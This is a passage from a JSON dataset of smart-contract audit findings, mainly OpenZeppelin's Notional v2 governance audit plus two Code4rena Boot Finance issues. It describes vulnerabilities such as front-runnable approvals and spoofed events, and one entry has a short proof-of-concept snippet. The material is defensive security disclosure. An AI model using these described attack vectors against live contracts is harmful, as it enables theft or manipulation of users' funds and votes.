      ]
    },
    {
      "id": "10763",
      "title": "[L03] Implicit casting",
      "impact": "LOW",
      "content": "Throughout the codebase, many instances of implicit casting between types exist.\n\n\nSome examples of such behavior can be found in the `NoteERC20.sol` file on:\n\n\n* [Line 96](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/NoteERC20.sol#L96) where the each element of the `initialGrantAmount` is being casted in the `Transfer` event.\n* [Line 99](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/NoteERC20.sol#L99) where an implicit casting on the granted amount occurs when it is being compared to the total supply.\n* [Line 107](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/NoteERC20.sol#L107) where the allowance in `uint96` for a pair of accounts is casted into `uint256` by the return operation.\n* [Line 127](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/NoteERC20.sol#L127) where the amount value is casted in the `Approval` event.\n* [Line 135](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/NoteERC20.sol#L135) where the balance in `uint96` is casted into `uint256` by the return operation.\n\n\nWhenever a different type of variable is needed, consider either checking and casting the variable into the desired type or using OpenZeppelin’s [`SafeCast`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/utils/SafeCast.sol) library which provides overflow checking when casting from one type of number to another.\n\n\n***Update:** Acknowledged, and will not fix. Notional’s statement for this issue:*\n\n\n\n> \n> *Won’t fix this, it adds to gas costs to do this checking and since we are casting to larger unsigned sizes I don’t see a potential overflow issue.*\n> \n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Notional Governance Contracts v2 Audit",
      "source_link": "https://blog.openzeppelin.com/notional-v2-audit-governance-contracts/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10762",
      "title": "[L02] Lack of guardian-role transfer",
      "impact": "LOW",
      "content": "The [guardian address from the `GovernorAlpha` contract](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/GovernorAlpha.sol#L36) has a special role inside the system.\n\n\nHowever, if the address associated with the `guardian` gets compromised, there is no way to transfer those special roles to another address.\n\n\nConsider creating a function to transfer the `guardian` role to another address or consider documenting this limitation.\n\n\n***Update:** Fixed in [pull request 30](https://github.com/notional-finance/contracts-v2/pull/30/files).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Notional Governance Contracts v2 Audit",
      "source_link": "https://blog.openzeppelin.com/notional-v2-audit-governance-contracts/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10761",
      "title": "[L01] Users can emit Approval and VoteCast events to deceive offline services",
      "impact": "LOW",
      "content": "The [`NoteERC20` contract](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/NoteERC20.sol#L11) implements the functionalities of the `NOTE` token that allow users to delegate their voting power and vote proposals. However, if a non-allowed user tries to transfer zero number of tokens on behalf of another another account by calling the [`transferFrom`](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/NoteERC20.sol#L155) function, the transaction will not only succeed but will also emit both the `Transfer` and `Approval` events, allowing a malicious user to disguise this harmless transaction as an approval on a non-owned account.\n\n\nSimilarly, in the [`GovernorAlpha` contract](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/GovernorAlpha.sol#L13), the [`_castVote`](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/GovernorAlpha.sol#L405) function can also be successfully used by an user that does not have any voting power to submit their vote, resulting in the emission of the `VoteCast` event.\n\n\nAlthough these situations will not impact in the voting’s result nor the users’ balances, the emission of these `Approval` and `VoteCast` events may be used to spam offline services, to confuse users, or to perform phishing attacks. Consider either requiring non-zero values in those functions to prevent users from being deceived and to improve the readability of off-chain services that track event logs, or documenting and letting the users know about this possible attack.\n\n\n***Update:** Fixed on [pull request 26](https://github.com/notional-finance/contracts-v2/pull/26/files). However, the changes has broken the [`ERC20` compliant token compatibility](https://eips.ethereum.org/EIPS/eip-20#transferfrom) because no `Transfer` event is emitted on zero value transfers. Consider emitting the `Transfer` event on such cases.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Notional Governance Contracts v2 Audit",
      "source_link": "https://blog.openzeppelin.com/notional-v2-audit-governance-contracts/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10760",
      "title": "[M09] Variables are not initialized",
      "impact": "MEDIUM",
      "content": "In the [`NoteERC20` contract](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/NoteERC20.sol#L11) a [`for` statement is used](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/NoteERC20.sol#L92) to distribute the grant tokens between all the initial accounts.\n\n\nHowever, the index `i` used to cycle among all the elements is not initialized with zero and its default value is used instead. Relying on the default value of a variable is not a recommended and secure methodology to perform due to the unexpected effects that may occur when this is not true, whether it is the result of a compilation bug or the outcome of a security issue.\n\n\nSimilarly, during the contract [initialization](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/NoteERC20.sol#L83), the [`totalGrants` variable](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/NoteERC20.sol#L91) is used as a counter for all the distributed grant tokens but it is not initialized with a zero value before its usage.\n\n\nConsider initializing all variables, specially indexes and counters, that will use their initial value during operation.\n\n\n***Update:** Fixed in [pull request 23](https://github.com/notional-finance/contracts-v2/pull/23/files).*",
      "summary": "\nA bug was found in the `NoteERC20` contract where a `for` statement was used to distribute grant tokens between the initial accounts. The index `i` used to cycle through the accounts was not initialized with zero, and relied on the default value. This is not a secure methodology and can lead to unexpected effects. Additionally, the `totalGrants` variable, which was used as a counter for the distributed grant tokens, was not initialized with a zero value. To fix this issue, all variables, particularly indexes and counters, should be initialized before use. This bug has since been fixed in pull request 23.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Notional Governance Contracts v2 Audit",
      "source_link": "https://blog.openzeppelin.com/notional-v2-audit-governance-contracts/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10759",
      "title": "[M08] Untested custom SafeMath library in use",
      "impact": "MEDIUM",
      "content": "The [`GovernorAlpha`](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/GovernorAlpha.sol#L463-L474) and the [`NoteERC20`](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/NoteERC20.sol#L371-L398) contracts make use of a `SafeMath` alike library embedded into the contracts based on [OpenZeppelin’s `SafeMath` library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.4.0-solc-0.7/contracts/math/SafeMath.sol), customized to support safe mathematical operations for unsigned integers of 32 and 96 bits. Yet, none of the functions in the implemented `SafeMath` library are tested, which may hinder users and developers’ trust in this custom library. Moreover, any change in the library is not going to be detected by the current test suite, rendering all business logic depending on it vulnerable to potential security issues introduced by these future modifications.\n\n\nConsider including thorough and extensive unit tests for the `SafeMath` library.\n\n\n***Update:** Acknowledged, and will not fix. Notional’s statement for this issue:*\n\n\n\n> \n> *Won’t fix, have manually tested that the methods don’t overflow.*\n> \n> \n>",
      "summary": "\nThis bug report is regarding the [`GovernorAlpha`](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/GovernorAlpha.sol#L463-L474) and the [`NoteERC20`](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/NoteERC20.sol#L371-L398) contracts, which make use of a custom `SafeMath` library based on OpenZeppelin’s `SafeMath` library. The problem is that the library is not tested, which can be a security risk as any changes in the future can go unnoticed. \n\nThe suggestion is to include thorough and extensive unit tests for the `SafeMath` library. However, Notional has acknowledged the issue and stated that they have manually tested that the methods don’t overflow, therefore the issue will not be fixed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Notional Governance Contracts v2 Audit",
      "source_link": "https://blog.openzeppelin.com/notional-v2-audit-governance-contracts/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10758",
      "title": "[M07] Mistakenly deposited tokens in Reservoir would get stuck",
      "impact": "MEDIUM",
      "content": "The [`Reservoir` contract](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/Reservoir.sol#L14) allows the protocol to distribute a token at a fixed rate, predominantly to the protocol’s reserve, by [dripping them every so often](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/Reservoir.sol#L51).\n\n\nThe [parameters](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/Reservoir.sol#L18-L30) involved in the process are set during the deployment of the contract and it is not possible to modify them afterwards.\n\n\nBecause this contract may be deployed several times to drip a variety of tokens at the same time, it is possible that during the process a certain `tokenA` could be sent by mistake to a `Reservoir` contract that only handles a `tokenB`. In such scenario, all the `tokenA` funds sent to that contract will get stuck due to the impossibility of withdrawing/transferring them to any other address.\n\n\nConsider implementing the functionality to withdraw or transfer those tokens, different from the [`TOKEN` token](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/Reservoir.sol#L24), to the reserve to prevent that funds could get trapped inside the `Reservoir` contract.\n\n\n***Update:** Acknowledged, and will not fix. Notional’s statement for this issue:*\n\n\n\n> \n> *Won’t fix, the intention is to only use the reservoir for NOTE tokens.*\n> \n> \n>",
      "summary": "\nThis bug report is about the [`Reservoir` contract](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/Reservoir.sol#L14), which is used to distribute tokens at a fixed rate. During the process, it is possible that a certain token (e.g. `tokenA`) could be sent by mistake to a `Reservoir` contract that only handles a different token (e.g. `tokenB`). In such a case, the `tokenA` funds sent to that contract would become stuck due to the impossibility of withdrawing/transferring them to any other address. It is suggested that the functionality to withdraw or transfer the tokens should be implemented to prevent this from happening. However, the team at Notional have decided not to fix this issue as they only intend to use the reservoir for one token (`NOTE`).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Notional Governance Contracts v2 Audit",
      "source_link": "https://blog.openzeppelin.com/notional-v2-audit-governance-contracts/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10757",
      "title": "[M06] Reservoir does not accept ETH",
      "impact": "MEDIUM",
      "content": "The [`Reservoir` contract](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/Reservoir.sol#L14) has no way to accept `ETH`, even though governance can [execute proposals](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/GovernorAlpha.sol#L280-L285) that handle `ETH`.\n\n\nWhether the `Reservoir` contract should handle `ETH` or not, for instance by using `WETH` instead of `ETH`, this expectation should be properly documented. Consider either implementing the functionality to allow the `Rerservoir` contract to handle and drip `ETH` or documenting the reasons behind this choice.\n\n\n***Update:** Fixed in [pull request 24](https://github.com/notional-finance/contracts-v2/pull/24/files) by adding documentation about the design choice.*",
      "summary": "\nThis bug report is about the Reservoir contract, which is part of the Notional Finance Contracts v2. The Reservoir contract does not have the ability to accept ETH, even though governance can execute proposals that handle ETH. It is recommended that either the functionality is implemented to allow the Reservoir contract to handle and drip ETH, or that the reasons behind this choice are documented. This bug has been fixed in the Pull Request 24 by adding documentation about the design choice.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Notional Governance Contracts v2 Audit",
      "source_link": "https://blog.openzeppelin.com/notional-v2-audit-governance-contracts/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10756",
      "title": "[M05] Test coverage script fails to deliver the report",
      "impact": "MEDIUM",
      "content": "Even though the project uses the [`Brownie` package](https://eth-brownie.readthedocs.io/en/stable/quickstart.html) to automate the tests and compile the contracts, running the script to get the coverage of the tests throughout the codebase ends up in a frozen task without ever delivering the actual code coverage report. Without this report it is impossible to know whether there are parts of the code never executed by the automated tests; so for every change, a full manual test suite has to be executed to make sure that nothing is broken or misbehaving.\n\n\nConsider fixing and documenting how to run the test coverage scripts and making that coverage reach at least 95% of the source code.\n\n\n***Update:** Acknowledged. Notional’s statement for this issue:*\n\n\n\n> \n> *This is currently an issue with performance limitations in ganache and the way that brownie runs its tests. It’s on my list to dig into this in more depth and get it fixed but won’t be fixed as a result of this audit.*\n> \n> \n>",
      "summary": "\nThis bug report is about an issue with the `Brownie` package, which is used to automate tests and compile contracts. The issue is that when running the script to get the coverage of the tests, the task freezes without delivering the code coverage report. This means that for every change, the project must run a full manual test suite to make sure nothing is broken. The recommendation is to fix and document how to run the test coverage scripts and reach at least 95% of the source code.\n\nThe issue has been acknowledged and Notional's statement is that it is a performance limitation in ganache and the way that brownie runs its tests. It is on their list to investigate and fix but won't be fixed as a result of the audit.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Notional Governance Contracts v2 Audit",
      "source_link": "https://blog.openzeppelin.com/notional-v2-audit-governance-contracts/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10755",
      "title": "[M04] Incomplete set of unit tests",
      "impact": "MEDIUM",
      "content": "No tests were found for several parts of the features implemented in the contracts and some unit tests were completely empty after its declaration, such as the ones in the [`test_governance.py` file](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/tests/governance/test_governance.py#L213). This is considered a major shortcoming in the project, as there is no way to determine if the current implementation matches the system’s expected behavior. Thorough unit tests aiming at 95% coverage are in order for the security of the project to be assessed in a future audit. Integrating test coverage reports in every single pull request of the project is also highly advisable.\n\n\n***Update:** Partially fixed in [pull request 33](https://github.com/notional-finance/contracts-v2/pull/33/files). The test file no longer has empty units of tests, although no further cases have been tested.*",
      "summary": "\nThis bug report is about the lack of unit tests in the Notional Finance project. There were no tests for some parts of the features, and some unit tests were empty. This is a major issue, as it can't be determined if the implementation matches the expected behavior. It is recommended to have 95% coverage of unit tests for the security of the project to be assessed in a future audit. It is also suggested to integrate test coverage reports in every pull request of the project. The bug was partially fixed in Pull Request 33, where the test file no longer has empty units of tests, but no further cases have been tested.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Notional Governance Contracts v2 Audit",
      "source_link": "https://blog.openzeppelin.com/notional-v2-audit-governance-contracts/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10754",
      "title": "[M03] Lack of event emission after sensitive actions",
      "impact": "MEDIUM",
      "content": "The following functions do not emit relevant events after executing sensitive actions.\n\n\n* In the `GovernorAlpha` contract, the [`__abdicate` function](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/GovernorAlpha.sol#L457) does not emit any event when the [`guardian`](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/GovernorAlpha.sol#L36) renounces its role.\n* In the `Reservoir` contract, the [`drip` function](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/Reservoir.sol#L51) does not emit a distinct event besides a regular [`Transfer` event](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/Reservoir.sol#L49).\n\n\nConsider emitting events after sensitive changes take place, to facilitate tracking and notify off-chain clients following the contracts’ activity.\n\n\n***Update:** Fixed in [pull request 25](https://github.com/notional-finance/contracts-v2/pull/25/files).*",
      "summary": "\nThis bug report is about two functions, `__abdicate` from the `GovernorAlpha` contract and `drip` from the `Reservoir` contract, which do not emit relevant events after executing sensitive actions. This means that off-chain clients, who are following the contracts' activity, are not being notified of these changes.\n\nThe report suggests that events should be emitted after sensitive changes take place, to facilitate tracking and notify off-chain clients. The issue has been fixed in pull request 25.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Notional Governance Contracts v2 Audit",
      "source_link": "https://blog.openzeppelin.com/notional-v2-audit-governance-contracts/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10753",
      "title": "[M02] Initial NOTE token funds could be lost",
      "impact": "MEDIUM",
      "content": "The [initialization of the `NoteERC20` contract](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/NoteERC20.sol#L83-L100) requires the `initialAccounts` array of addresses and `initialGrantAmount` array of values to assign the grant tokens into their accounts. In the [loop through the `initialGrantAmount` array](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/NoteERC20.sol#L92-L97), all the grants are accumulated in the [`totalGrants` variable](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/NoteERC20.sol#L93), and the `initialAccounts` accounts are granted their corresponding `initialGrantAmount` amount by [updating their balances](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/NoteERC20.sol#L94).\n\n\nHowever, if the deployment transaction has duplicated elements in the `initialAccounts` array, the `totalGrants` will represent the sum of all the `initialGrantAmount` elements, but the balances for those accounts will not reflect the sum of all their grants. This is due to the [overwrite operation that it is made to all the balances](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/NoteERC20.sol#L94) which will remove all old balances of that duplicated account.\n\n\nAlthough this issue could be mitigated by redeploying the contract while bootstrapping the protocol, the effect of the issue could be more serious in cases where the governance is in charge of updating the `NoteERC20` contract through proposals. It could become impossible to vote new proposals or fix the protocol if the available voting power is not enough to pass a new proposal. Consider validating that there are not duplicate values in the `initialAccounts` array.\n\n\n***Update:** Fixed in [pull request 23](https://github.com/notional-finance/contracts-v2/pull/23/files) by checking if the balance is zero before granting tokens to the initial accounts.*",
      "summary": "\nA bug has been found in the `NoteERC20` contract during the initialization process. The `initialAccounts` array of addresses and `initialGrantAmount` array of values are used to assign the grant tokens into their accounts. If the deployment transaction has duplicated elements in the `initialAccounts` array, the `totalGrants` will represent the sum of all the `initialGrantAmount` elements, but the balances for those accounts will not reflect the sum of all their grants due to an overwrite operation that is made to all the balances. This could cause serious issues in cases where the governance is in charge of updating the `NoteERC20` contract through proposals, as it could become impossible to vote new proposals or fix the protocol if the available voting power is not enough. To fix this, the developers have added a check to see if the balance is zero before granting tokens to the initial accounts.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Notional Governance Contracts v2 Audit",
      "source_link": "https://blog.openzeppelin.com/notional-v2-audit-governance-contracts/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10752",
      "title": "[M01] Approval process can be front-run",
      "impact": "MEDIUM",
      "content": "The ERC-20 standard [`approve`](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/NoteERC20.sol#L110-L129) function lets `NOTE` owners specify a `spender` that may transfer up to `rawAmount` tokens from the owner’s balance.  \n\nThe same `approve` function is used to make changes to this limit imposed on a `spender`, by calling the function again which replaces the value in the [`allowances` mapping](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/NoteERC20.sol#L28).\n\n\nPerforming a direct overwrite of the value in the `allowances` mapping is susceptible to front-running scenarios by an attacker (e.g., an approved `spender`). By monitoring the mempool for changes in the allowances, an attacker could spend both the previous and new `allowances` limits.\n\n\nAlthough this vulnerability is acknowledged [in a comment](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/NoteERC20.sol#L112), it is not mitigated. Consider using the `safeIncreaseAllowance` and the `safeDecreaseAllowance` methods from the [OpenZeppelin’s `SafeERC20` library](https://docs.openzeppelin.com/contracts/3.x/api/token/erc20#SafeERC20).\n\n\n***Update:** Acknowledged, and will not fix. Notional’s statement for this issue:*\n\n\n\n> \n>  \\_Won’t fix, unclear how one would resolve this in the “approve” method without adding the separate atomic increaseAllowance and decreaseAllowance methods. My feeling on this issue is that it has to be dealt with client side anyway (increaseAllowance / decreaseAllowance are non-standard) and if the client is savvy enough to be aware of those methods it can also enforce that the allowance is set to zero before it is increased. Also just from a practical perspective, allowances are generally set to MAX*UINT256 or 0 for most apps anyway just to simplify the user experience.*\n> \n> \n>",
      "summary": "\nThis bug report focuses on the vulnerability of the ERC-20 standard `approve` function, which allows owners to specify a `spender` that may transfer a certain amount of tokens from the owner's balance. The same `approve` function is used to make changes to the limit imposed on a `spender`, by calling the function again and replacing the value in the `allowances` mapping. This is susceptible to front-running scenarios by an attacker, who can monitor the mempool for changes in the allowances and spend both the previous and new `allowances` limits.\n\nThe bug is acknowledged in a comment but not mitigated. A suggestion is made to use the `safeIncreaseAllowance` and the `safeDecreaseAllowance` methods from the OpenZeppelin's `SafeERC20` library. However, the bug is not fixed and Notional's statement for this issue is that it has to be dealt with client side anyway and if the client is savvy enough to be aware of those methods, it can also enforce that the allowance is set to zero before it is increased. In addition, allowances are generally set to MAX*UINT256 or 0 for most apps to simplify the user experience.",
      "quality_score": 4,
      "rarity_score": 1,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Notional Governance Contracts v2 Audit",
      "source_link": "https://blog.openzeppelin.com/notional-v2-audit-governance-contracts/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10751",
      "title": "[H01] Proposal process could result in the wrong outcome",
      "impact": "HIGH",
      "content": "The [`NoteERC20` contract](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/NoteERC20.sol#L11) keeps track of the voting power that users [delegate](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/NoteERC20.sol#L183) in order to vote protocol’s proposals.\n\n\nThe [`getPriorVotes`](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/NoteERC20.sol#L235) function returns the number of votes an account had as of a given block using a [binary search over all the available checkpoints](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/NoteERC20.sol#L253-L272). However, under certain cases when the [pivot `center` checkpoint](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/NoteERC20.sol#L256) corresponds to the queried block number, meaning that `checkpoints[account][center].fromBlock == blockNumber`, [only the `checkpoints[account][center].votes` value will be returned](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/NoteERC20.sol#L258-L259). Nevertheless, [in all other instances](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/NoteERC20.sol#L260-L272) the output will be the sum of the respective checkpoint votes and the value from the [`getUnclaimedVotes` function](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/NoteERC20.sol#L279).\n\n\nAlthough the `getUnclaimedVotes` function has been left out from the current audit’s scope by forcing it to return a zero value, its functionality will be implemented in the future. When the `getUnclaimedVotes` function returns an output different from zero, this discrepancy in the return values in the binary search could be used as an attack vector to alter the result of the election. Consider updating the `getPriorVotes` function to handle `getUnclaimedVotes` consistently across all the outcomes.\n\n\n***Update:** Fixed in [pull request 22](https://github.com/notional-finance/contracts-v2/pull/22/files).*",
      "summary": "\nThe NoteERC20 contract is used to keep track of the voting power that users delegate in order to vote on protocol proposals. The getPriorVotes function is used to return the number of votes an account had as of a given block using a binary search over all the available checkpoints. However, if the pivot checkpoint corresponds to the queried block number, only the checkpoints[account][center].votes value will be returned. In all other instances, the output will be the sum of the respective checkpoint votes and the value from the getUnclaimedVotes function. \n\nThe getUnclaimedVotes function has been left out from the current audit’s scope, but it will be implemented in the future. If this function returns an output different from zero, this discrepancy in the return values in the binary search could be used as an attack vector to alter the result of the election. To prevent this, the getPriorVotes function should be updated to handle getUnclaimedVotes consistently across all the outcomes. \n\nThis issue has been fixed in pull request 22.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Notional Governance Contracts v2 Audit",
      "source_link": "https://blog.openzeppelin.com/notional-v2-audit-governance-contracts/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "42332",
      "title": "[M-04] Get virtual price is not monotonically increasing",
      "impact": "MEDIUM",
      "content": "_Submitted by jonah1005_\n\n#### Impact\n\nThere's a feature of `virtualPrice` that is monotonically increasing regardless of the market. This function is heavily used in multiple protocols. e.g.(curve metapool, mim, ...) This is not held in the current implementation of customSwap since `customPrecisionMultipliers` can be changed by changing the target price.\n\nThere are two issues here:\nThe meaning of `virtualPrice` would be vague.\nThis may damage the lp providers as the protocol that adopts it may be hacked.\n\nI consider this is a medium-risk issue.\n\n#### Proof of Concept\n\nWe can set up a mockSwap with extra `setPrecisionMultiplier` to check the issue.\n\n```solidity\n    function setPrecisionMultiplier(uint256 multipliers) external {\n        swapStorage.tokenPrecisionMultipliers[0] = multipliers; \n    }\n```\n\n```python\n    print(swap.functions.getVirtualPrice().call())\n    swap.functions.setPrecisionMultiplier(2).transact()\n    print(swap.functions.getVirtualPrice().call())\n\n",
      "summary": "\nThe bug report highlights an issue with the `virtualPrice` feature in the protocol. This feature is supposed to increase in value consistently, but it has been found that it can be manipulated by changing the `customPrecisionMultipliers` setting. This can lead to confusion and potential exploitation by malicious actors. The report suggests that this issue is of medium risk and provides a proof of concept using a mockSwap with an extra `setPrecisionMultiplier` function to demonstrate the problem.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Boot Finance",
      "source_link": "https://code4rena.com/reports/2021-11-bootfinance",
      "github_link": "https://github.com/code-423n4/2021-11-bootfinance-findings/issues/185",
      "tags": [],
      "finders": []
    },
    {
      "id": "42331",
      "title": "[M-03] Investor can't claim the last tokens (via claim() )",
      "impact": "MEDIUM",
      "content": "_Submitted by gpersoon_\n\n#### Impact\n\nSuppose you are an investor and want to claim the last part of your claimable tokens (or your entire set of claimable tokens if you haven't claimed anything yet).\nThen you call the function `claim()` of `InvestorDistribution.sol`, which has the following statement:\n`require(investors\\[msg.sender].amount - claimable != 0);`\nThis statement will prevent you from claiming your tokens because it will stop execution.\n\nNote: with the function `claimExact()` it is possible to claim the last part.\n\n#### Proof of Concept\n\n// <https://github.com/code-423n4/2021-11-bootfinance/blob/7c457b2b5ba6b2c887dafdf7428fd577e405d652/vesting/contracts/InvestorDistribution.sol#L113-L128>\n\n```solidity\nfunction claim() external nonReentrant {\n...\nrequire(investors\\[msg.sender].amount - claimable != 0);\ninvestors\\[msg.sender].amount -= claimable;\n```\n\n#### Tools Used\n\n#### Recommended Mitigation Steps\n\nRemove the require statement.\n\n**[chickenpie347 (Boot Finance) commented](https://github.com/code-423n4/2021-11-bootfinance-findings/issues/131#issuecomment-964723021):**\n > Duplicate of issue #130 \n\n**[chickenpie347 (Boot Finance) commented](https://github.com/code-423n4/2021-11-bootfinance-findings/issues/131#issuecomment-964723644):**\n > I just noticed it's different files. The AirdropDistrbution.sol and InvestorDistribution.sol contracts were built on the same base, with slight changes.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2021-11-bootfinance-findings/issues/131#issuecomment-1007869122):**\n > Downgrading to medium risk as an alternative path does exist for claiming the drop. Funds are not lost, but the availability of them is compromised. Per Docs:\n> \n> ```\n> 2 — Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n> 3 — High: Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).\n> ```\n\n\n\n",
